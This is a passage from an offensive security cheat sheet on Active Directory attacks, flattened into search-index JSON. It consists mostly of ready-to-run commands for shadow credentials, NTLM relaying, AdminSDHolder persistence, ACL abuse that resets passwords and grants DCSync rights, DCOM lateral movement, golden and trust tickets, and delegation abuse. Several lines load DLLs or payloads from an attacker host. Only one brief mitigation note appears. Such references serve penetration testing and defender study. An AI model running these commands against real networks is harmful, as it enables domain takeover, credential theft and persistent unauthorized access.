Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device. pywhisker.py -d \"FQDN_DOMAIN\" -u \"user1\" -p \"CERTIFICATE_PASSWORD\" --target \"TARGET_SAMNAME\" --action \"list\" python3 pywhisker.py -d \"domain.local\" -u \"user1\" -p \"complexpassword\" --target \"user2\" --action \"add\" --filename \"test1\" # Removes a key credential from the target object specified by a DeviceID GUID. python3 pywhisker.py -d \"domain.local\" -u \"user1\" -p \"complexpassword\" --target \"user2\" --action \"remove\" --device-id \"a8ce856e-9b58-61f9-8fd3-b079689eb46e\" Scenario : Scenario 1 : Shadow Credential relaying Trigger an NTLM authentication from DC01 (PetitPotam) Relay it to DC02 (ntlmrelayx) Edit DC01 's attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker) Alternatively : ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$' Scenario 2 : Workstation Takeover with RBCD ```ps1 # Only for C2: Add Reverse Port Forward from 8081 to Team Server 81 # Set up ntlmrelayx to relay authentication from target workstation to DC proxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-target ws2\\$ --http-port 81 # Execute printer bug to trigger authentication from target workstation proxychains python3 printerbug.py ez.lab/matt:Password1!@ws2.ez.lab ws1@8081/file # Get a TGT using the newly acquired certificate via PKINIT proxychains python3 gettgtpkinit.py ez.lab/ws2\\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR # Get a TGS for the target account proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\ws2\\$:ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v # Utilize the TGS for future activity export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab ```","title":"Shadow Credentials"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dangerous-built-in-groups-usage","text":"If you do not want modified ACLs to be overwritten every hour, you should change ACL template on the object CN=AdminSDHolder,CN=System or set \"dminCount attribute to 0 for the required object. The AdminCount attribute is set to 1 automatically when a user is assigned to any privileged group, but it is never automatically unset when the user is removed from these group(s). Find users with AdminCount=1 . crackmapexec ldap 10.10.10.10 -u username -p password --admin-count # or python ldapdomaindump.py -u example.com\\john -p pass123 -d ';' 10.10.10.10 jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json # or Get-ADUser -LDAPFilter \"(objectcategory=person)(samaccountname=*)(admincount=1)\" Get-ADGroup -LDAPFilter \"(objectcategory=group) (admincount=1)\" # or ([adsisearcher]\"(AdminCount=1)\").findall()","title":"Dangerous Built-in Groups Usage"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#adminsdholder-abuse","text":"The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all \"protected groups\" in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins. If you modify the permissions of AdminSDHolder , that permission template will be pushed out to all protected accounts automatically by SDProp (in an hour). E.g: if someone tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group. # Add a user to the AdminSDHolder group: Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity username -Rights All -Verbose # Right to reset password for toto using the account titi Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword # Give all rights Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName toto -Verbose -Rights All","title":"AdminSDHolder Abuse"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#abusing-dns-admins-group","text":"It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM). :warning: Require privileges to restart the DNS service. Enumerate members of DNSAdmins group ps1 Get-NetGroupMember -GroupName \"DNSAdmins\" Get-ADGroupMember -Identity DNSAdmins Change dll loaded by the DNS service ```ps1 # with RSAT dnscmd /config /serverlevelplugindll \\attacker_IP\\dll\\mimilib.dll dnscmd 10.10.10.11 /config /serverlevelplugindll \\10.10.10.10\\exploit\\privesc.dll","title":"Abusing DNS Admins Group"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#with-dnsserver-module","text":"$dnsettings = Get-DnsServerSetting -ComputerName -Verbose -All $dnsettings.ServerLevelPluginDll = \"\\attacker_IP\\dll\\mimilib.dll\" Set-DnsServerSetting -InputObject $dnsettings -ComputerName -Verbose * Check the previous command success ps1 Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\ -Name ServerLevelPluginDll * Restart DNS ps1 sc \\dc01 stop dns sc \\dc01 start dns ```","title":"with DNSServer module"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#abusing-active-directory-aclsaces","text":"Check ACL for an User with ADACLScanner . ADACLScan.ps1 -Base \"DC=contoso;DC=com\" -Filter \"(&(AdminCount=1))\" -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show","title":"Abusing Active Directory ACLs/ACEs"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#genericall","text":"GenericAll on User : We can reset user's password without knowing the current password GenericAll on Group : Effectively, this allows us to add ourselves (the user hacker) to the Domain Admin group : On Windows : net group \"domain admins\" hacker /add /domain On Linux: using the Samba software suite : net rpc group ADDMEM \"GROUP NAME\" UserToAdd -U 'hacker%MyPassword123' -W DOMAIN -I [DC IP] using bloodyAD: bloodyAD.py --host [DC IP] -d DOMAIN -u hacker -p MyPassword123 addObjectToGroup UserToAdd 'GROUP NAME' GenericAll/GenericWrite : We can set a SPN on a target account, request a TGS, then grab its hash and kerberoast it. ```powershell # Check for interesting permissions on accounts: Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match \"RDPUsers\"} # Check if current user has already an SPN setted: PowerView2 > Get-DomainUser -Identity | select serviceprincipalname # Force set the SPN on the account: Targeted Kerberoasting PowerView2 > Set-DomainObject -Set @{serviceprincipalname='ops/whatever1'} PowerView3 > Set-DomainObject -Identity -Set @{serviceprincipalname='any/thing'} # Grab the ticket PowerView2 > $User = Get-DomainUser username PowerView2 > $User | Get-DomainSPNTicket | fl PowerView2 > $User | Select serviceprincipalname # Remove the SPN PowerView2 > Set-DomainObject -Identity username -Clear serviceprincipalname ``` GenericAll/GenericWrite : We can change a victim's userAccountControl to not require Kerberos preauthentication, grab the user's crackable AS-REP, and then change the setting back. On Windows: ```powershell","title":"GenericAll"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#modify-the-useraccountcontrol","text":"PowerView2 > Get-DomainUser username | ConvertFrom-UACValue PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose","title":"Modify the userAccountControl"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#grab-the-ticket","text":"PowerView2 > Get-DomainUser username | ConvertFrom-UACValue ASREPRoast > Get-ASREPHash -Domain domain.local -UserName username","title":"Grab the ticket"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#set-back-the-useraccountcontrol","text":"PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose PowerView2 > Get-DomainUser username | ConvertFrom-UACValue * On Linux: bash","title":"Set back the userAccountControl"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#modify-the-useraccountcontrol_1","text":"$ bloodyAD.py --host [DC IP] -d DOMAIN -u AttackerUser -p MyPassword setDontReqPreauthFlag target_user","title":"Modify the userAccountControl"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#grab-the-ticket_1","text":"$ GetNPUsers.py DOMAIN/target_user -format -outputfile","title":"Grab the ticket"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#set-back-the-useraccountcontrol_1","text":"$ bloodyAD.py --host [DC IP] -d DOMAIN -u AttackerUser -p MyPassword setDontReqPreauthFlag target_user false ```","title":"Set back the userAccountControl"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#genericwrite","text":"Reset another user's password On Windows: powershell # https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1 $user = 'DOMAIN\\user1'; $pass= ConvertTo-SecureString 'user1pwd' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential $user, $pass; $newpass = ConvertTo-SecureString 'newsecretpass' -AsPlainText -Force; Set-DomainUserPassword -Identity 'DOMAIN\\user2' -AccountPassword $newpass -Credential $creds; On Linux: ```bash # Using rpcclient from the Samba software suite rpcclient -U 'attacker_user%my_password' -W DOMAIN -c \"setuserinfo2 target_user 23 target_newpwd\"","title":"GenericWrite"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-bloodyad-with-pass-the-hash","text":"bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd ``` WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue \"\\\\10.0.0.5\\totallyLegitScript.ps1","title":"Using bloodyAD with pass-the-hash"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#genericwrite-and-remote-connection-manager","text":"Now let\u2019s say you are in an Active Directory environment that still actively uses a Windows Server version that has RCM enabled, or that you are able to enable RCM on a compromised RDSH, what can we actually do ? Well each user object in Active Directory has a tab called \u2018Environment\u2019. This tab includes settings that, among other things, can be used to change what program is started when a user connects over the Remote Desktop Protocol (RDP) to a TS/RDSH in place of the normal graphical environment. The settings in the \u2018Starting program\u2019 field basically function like a windows shortcut, allowing you to supply either a local or remote (UNC) path to an executable which is to be started upon connecting to the remote host. During the logon process these values will be queried by the RCM process and run whatever executable is defined. - https://sensepost.com/blog/2020/ace-to-rce/ :warning: The RCM is only active on Terminal Servers/Remote Desktop Session Hosts. The RCM has also been disabled on recent version of Windows (>2016), it requires a registry change to re-enable. $UserObject = ([ADSI](\"LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld\")) $UserObject.TerminalServicesInitialProgram = \"\\\\1.2.3.4\\share\\file.exe\" $UserObject.TerminalServicesWorkDirectory = \"C:\\\" $UserObject.SetInfo() NOTE: To not alert the user the payload should hide its own process window and spawn the normal graphical environment.","title":"GenericWrite and Remote Connection Manager"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#writedacl","text":"To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. Invoke-ACLPwn is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : ./Invoke-ACL.ps1 -SharpHoundLocation .\\sharphound.exe -mimiKatzLocation .\\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!' WriteDACL on Domain: On Windows: powershell # Give DCSync right to the principal identity Import-Module .\\PowerView.ps1 $SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\\user1', $SecPassword) Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local On Linux: ```bash","title":"WriteDACL"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#give-dcsync-right-to-the-principal-identity","text":"bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B addDomainSync user2","title":"Give DCSync right to the principal identity"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#remove-right-after-dcsync","text":"bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B delDomainSync user2 ``` WriteDACL on Group powershell Add-DomainObjectAcl -TargetIdentity \"INTERESTING_GROUP\" -Rights WriteMembers -PrincipalIdentity User1 net group \"INTERESTING_GROUP\" User1 /add /domain","title":"Remove right after DCSync"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#writeowner","text":"An attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they see fit. This can be achieved with Set-DomainObjectOwner (PowerView module). Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal' This ACE can be abused for an Immediate Scheduled Task attack, or for adding a user to the local admin group.","title":"WriteOwner"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#readlapspassword","text":"An attacker can read the LAPS password of the computer account this ACE applies to. This can be achieved with the Active Directory PowerShell module. Detail of the exploitation can be found in the Reading LAPS Password section. Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'","title":"ReadLAPSPassword"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#readgmsapassword","text":"An attacker can read the GMSA password of the account this ACE applies to. This can be achieved with the Active Directory and DSInternals PowerShell modules. # Save the blob to a variable $gmsa = Get-ADServiceAccount -Identity 'SQL_HQ_Primary' -Properties 'msDS-ManagedPassword' $mp = $gmsa.'msDS-ManagedPassword' # Decode the data structure using the DSInternals module ConvertFrom-ADManagedPasswordBlob $mp","title":"ReadGMSAPassword"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#forcechangepassword","text":"An attacker can change the password of the user this ACE applies to: * On Windows, this can be achieved with Set-DomainUserPassword (PowerView module): $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword On Linux: # Using rpcclient from the Samba software suite rpcclient -U 'attacker_user%my_password' -W DOMAIN -c \"setuserinfo2 target_user 23 target_newpwd\" # Using bloodyAD with pass-the-hash bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd","title":"ForceChangePassword"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dcom-exploitation","text":"DCOM is an extension of COM (Component Object Model), which allows applications to instantiate and access the properties and methods of COM objects on a remote computer. Impacket DCOMExec.py ```ps1 dcomexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-debug] [-codec CODEC] [-object [{ShellWindows,ShellBrowserWindow,MMC20}]] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-A authfile] [-keytab KEYTAB] target [command ...] dcomexec.py -share C$ -object MMC20 ' / : @ ' dcomexec.py -share C$ -object MMC20 ' / : @ ' 'ipconfig' python3 dcomexec.py -object MMC20 -silentcommand -debug $DOMAIN/$USER:$PASSWORD\\$@$HOST 'notepad.exe' # -object MMC20 specifies that we wish to instantiate the MMC20.Application object. # -silentcommand executes the command without attempting to retrieve the output. * CheeseTools - https://github.com/klezVirus/CheeseTools powershell # https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementDCOM/ -t, --target=VALUE Target Machine -b, --binary=VALUE Binary: powershell.exe -a, --args=VALUE Arguments: -enc -m, --method=VALUE Methods: MMC20Application, ShellWindows, ShellBrowserWindow, ExcelDDE, VisioAddonEx, OutlookShellEx, ExcelXLL, VisioExecLine, OfficeMacro -r, --reg, --registry Enable registry manipulation -h, -?, --help Show Help Current Methods: MMC20.Application, ShellWindows, ShellBrowserWindow, ExcelDDE, VisioAddonEx, OutlookShellEx, ExcelXLL, VisioExecLine, OfficeMacro. * Invoke-DCOM - https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Invoke-DCOM.ps1 powershell Import-Module .\\Invoke-DCOM.ps1 Invoke-DCOM -ComputerName '10.10.10.10' -Method MMC20.Application -Command \"calc.exe\" Invoke-DCOM -ComputerName '10.10.10.10' -Method ExcelDDE -Command \"calc.exe\" Invoke-DCOM -ComputerName '10.10.10.10' -Method ServiceStart \"MyService\" Invoke-DCOM -ComputerName '10.10.10.10' -Method ShellBrowserWindow -Command \"calc.exe\" Invoke-DCOM -ComputerName '10.10.10.10' -Method ShellWindows -Command \"calc.exe\" ```","title":"DCOM Exploitation"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dcom-via-mmc-application-class","text":"This COM object (MMC20.Application) allows you to script components of MMC snap-in operations. there is a method named \"ExecuteShellCommand\" under Document.ActiveView . PS C:\\> $com = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"10.10.10.1\")) PS C:\\> $com.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\calc.exe\",$null,$null,7) PS C:\\> $com.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\",$null,\"-enc DFDFSFSFSFSFSFSFSDFSFSF < Empire encoded string > \",\"7\") # Weaponized example with MSBuild PS C:\\> [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"10.10.10.1\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe\",$null,\"\\\\10.10.10.2\\webdav\\build.xml\",\"7\") Invoke-MMC20RCE : https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1","title":"DCOM via MMC Application Class"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dcom-via-office","text":"Excel.Application DDEInitiate RegisterXLL Outlook.Application CreateObject->Shell.Application->ShellExecute CreateObject->ScriptControl (office-32bit only) Visio.InvisibleApp (same as Visio.Application, but should not show the Visio window) Addons ExecuteLine Word.Application RunAutoMacro # Powershell script that injects shellcode into excel.exe via ExecuteExcel4Macro through DCOM Invoke-Excel4DCOM64.ps1 https://gist.github.com/Philts/85d0f2f0a1cc901d40bbb5b44eb3b4c9 Invoke-ExShellcode.ps1 https://gist.github.com/Philts/f7c85995c5198e845c70cc51cd4e7e2a # Using Excel DDE PS C:\\> $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\", \"$ComputerName\")) PS C:\\> $excel.DisplayAlerts = $false PS C:\\> $excel.DDEInitiate(\"cmd\", \"/c calc.exe\") # Using Excel RegisterXLL # Can't be used reliably with a remote target Require: reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\Trusted Locations /v AllowsNetworkLocations /t REG_DWORD /d 1 PS> $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\", \"$ComputerName\")) PS> $excel.RegisterXLL(\"EvilXLL.dll\") # Using Visio $visio = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Visio.InvisibleApp\", \"$ComputerName\")) $visio.Addons.Add(\"C:\\Windows\\System32\\cmd.exe\").Run(\"/c calc\")","title":"DCOM via Office"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dcom-via-shellexecute","text":"$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',\"10.10.10.1\") $obj = [System.Activator]::CreateInstance($com) $item = $obj.Item() $item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0)","title":"DCOM via ShellExecute"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dcom-via-shellbrowserwindow","text":":warning: Windows 10 only, the object doesn't exists in Windows 7 $com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',\"10.10.10.1\") $obj = [System.Activator]::CreateInstance($com) $obj.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0)","title":"DCOM via ShellBrowserWindow"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#trust-relationship-between-domains","text":"One-way Domain B trusts A Users in Domain A can access resources in Domain B Users in Domain B cannot access resources in Domain A Two-way Domain A trusts Domain B Domain B trusts Domain A Authentication requests can be passed between the two domains in both directions","title":"Trust relationship between domains"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#enumerate-trusts-between-domains","text":"nltest /trusted_domains or ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() SourceName TargetName TrustType TrustDirection ---------- ---------- --------- -------------- domainA.local domainB.local TreeRoot Bidirectional","title":"Enumerate trusts between domains"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#exploit-trusts-between-domains","text":":warning: Require a Domain-Admin level access to the current domain. Source Target Technique to use Trust relationship Root Child Golden Ticket + Enterprise Admin group (Mimikatz /groups) Inter Realm (2-way) Child Child SID History exploitation (Mimikatz /sids) Inter Realm Parent-Child (2-way) Child Root SID History exploitation (Mimikatz /sids) Inter Realm Tree-Root (2-way) Forest A Forest B PrinterBug + Unconstrained delegation ? Inter Realm Forest or External (2-way)","title":"Exploit trusts between domains"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#child-domain-to-forest-compromise-sid-hijacking","text":"Most trees are linked with dual sided trust relationships to allow for sharing of resources. By default the first domain created if the Forest Root. Requirements : - KRBTGT Hash - Find the SID of the domain ```powershell $ Convert-NameToSid target.domain.com\\krbtgt S-1-5-21-2941561648-383941485-1389968811-502 # with Impacket lookupsid.py domain/user:password@10.10.10.10 ``` Replace 502 with 519 to represent Enterprise Admins Create golden ticket and attack parent domain. powershell kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt","title":"Child Domain to Forest Compromise - SID Hijacking"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#forest-to-forest-compromise-trust-ticket","text":"Require: SID filtering disabled From the DC, dump the hash of the currentdomain\\targetdomain$ trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using Mimikatz, adding the SID for the target domain's enterprise admins group to our SID history .","title":"Forest to Forest Compromise - Trust Ticket"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dumping-trust-passwords-trust-keys","text":"Look for the trust name with a dollar ($) sign at the end. Most of the accounts with a trailing $ are computer accounts, but some are trust accounts. lsadump::trust /patch or find the TRUST_NAME$ machine account hash","title":"Dumping trust passwords (trust keys)"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#create-a-forged-trust-ticket-inter-realm-tgt-using-mimikatz","text":"mimikatz(commandline) # kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\\temp\\trust.kirbi mimikatz(commandline) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\\ad\\tools\\mcorp-ticket.kirbi","title":"Create a forged trust ticket (inter-realm TGT) using Mimikatz"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#use-the-trust-ticket-file-to-get-a-tgs-for-the-targeted-service","text":".\\asktgs.exe c:\\temp\\trust.kirbi CIFS/machine.domain.local .\\Rubeus.exe asktgs /ticket:c:\\ad\\tools\\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt Inject the TGS file and access the targeted service with the spoofed rights. kirbikator lsa .\\ticket.kirbi ls \\\\machine.domain.local\\c$","title":"Use the Trust Ticket file to get a TGS for the targeted service"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#privileged-access-management-pam-trust","text":"Require: Windows Server 2016 or earlier If we compromise the bastion we get Domain Admins privileges on the other domain Default configuration for PAM Trust ps1 # execute on our forest netdom trust lab.local /domain:bastion.local /ForestTransitive:Yes netdom trust lab.local /domain:bastion.local /EnableSIDHistory:Yes netdom trust lab.local /domain:bastion.local /EnablePIMTrust:Yes netdom trust lab.local /domain:bastion.local /Quarantine:No # execute on our bastion netdom trust bastion.local /domain:lab.local /ForestTransitive:Yes Enumerate ```ps1 # Using ADModule Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}","title":"Privileged Access Management (PAM) Trust"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#enumerate-shadow-security-principals","text":"Get-ADObject -SearchBase (\"CN=Shadow Principal Configuration,CN=Services,\" + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl ``` * Compromise * Using SID History * Using the previously found Shadow Security Principal","title":"Enumerate shadow security principals"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#kerberos-unconstrained-delegation","text":"The user sends a TGS to access the service, along with their TGT, and then the service can use the user's TGT to request a TGS for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html When a user authenticates to a computer that has unrestricted kerberos delegation privilege turned on, authenticated user's TGT ticket gets saved to that computer's memory. :warning: Unconstrained delegation used to be the only option available in Windows 2000","title":"Kerberos Unconstrained Delegation"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#spoolservice-abuse-with-unconstrained-delegation","text":"The goal is to gain DC Sync privileges using a computer account and the SpoolService bug. Requirements : - Object with Property Trust this computer for delegation to any service (Kerberos only) - Must have ADS_UF_TRUSTED_FOR_DELEGATION - Must not have ADS_UF_NOT_DELEGATED flag - User must not be in the Protected Users group - User must not have the flag Account is sensitive and cannot be delegated","title":"SpoolService Abuse with Unconstrained Delegation"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#find-delegation","text":":warning: : Domain controllers usually have unconstrained delegation enabled. Check the TrustedForDelegation property. ADModule powershell # From https://github.com/samratashok/ADModule PS> Get-ADComputer -Filter {TrustedForDelegation -eq $True} ldapdomaindump powershell $> ldapdomaindump -u \"DOMAIN\\\\Account\" -p \"Password123*\" 10.10.10.10 grep TRUSTED_FOR_DELEGATION domain_computers.grep CrackMapExec module powershell cme ldap 10.10.10.10 -u username -p password --trusted-for-delegation","title":"Find delegation"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#spoolservice-status","text":"Check if the spool service is running on the remote host ls \\\\dc01\\pipe\\spoolss python rpcdump.py DOMAIN/user:password@10.10.10.10","title":"SpoolService status"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#monitor-with-rubeus","text":"Monitor incoming connections from Rubeus. Rubeus.exe monitor /interval:1","title":"Monitor with Rubeus"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#force-a-connect-back-from-the-dc","text":"Due to the unconstrained delegation, the TGT of the computer account (DC$) will be saved in the memory of the computer with unconstrained delegation. By default the domain controller computer account has DCSync rights over the domain object. SpoolSample is a PoC to coerce a Windows host to authenticate to an arbitrary server using a \"feature\" in the MS-RPRN RPC interface. # From https://github.com/leechristensen/SpoolSample .\\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME .\\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB # DC01.HACKER.LAB is the domain controller we want to compromise # HELPDESK.HACKER.LAB is the machine with delegation enabled that we control. # From https://github.com/dirkjanm/krbrelayx printerbug.py 'domain/username:password'@<VICTIM-DC-NAME> <UNCONSTRAINED-SERVER-DC-NAME> # From https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689 python dementor.py -d domain -u username -p password <UNCONSTRAINED-SERVER-DC-NAME> <VICTIM-DC-NAME> If the attack worked you should get a TGT of the domain controller.","title":"Force a connect back from the DC"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#load-the-ticket","text":"Extract the base64 TGT from Rubeus output and load it to our current session. .\\Rubeus.exe asktgs /ticket:<ticket base64> /ptt Alternatively you could also grab the ticket using Mimikatz : mimikatz # sekurlsa::tickets Then you can use DCsync or another attack : mimikatz # lsadump::dcsync /user:HACKER\\krbtgt","title":"Load the ticket"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#mitigation","text":"Ensure sensitive accounts cannot be delegated Disable the Print Spooler Service","title":"Mitigation"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#ms-efsrpc-abuse-with-unconstrained-delegation","text":"Using PetitPotam , another tool to coerce a callback from the targeted machine, instead of SpoolSample . # Coerce the callback git clone https://github.com/topotam/PetitPotam python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP # Extract the ticket .\\Rubeus.exe asktgs /ticket:<ticket base64> /ptt","title":"MS-EFSRPC Abuse with Unconstrained Delegation"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#kerberos-constrained-delegation","text":"Request a Kerberos ticket which allows us to exploit delegation configurations, we can once again use Impackets getST.py script, however, Passing the -impersonate flag and specifying the user we wish to impersonate (any valid username). # Discover $ Get-DomainComputer -TrustedToAuth | select -exp dnshostname # Find the service $ Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo","title":"Kerberos Constrained Delegation"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#exploit-the-constrained-delegation","text":"Impacket bash $ getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10 Rubeus bash $ ./Rubeus.exe tgtdeleg /nowrap # this ticket can be used with 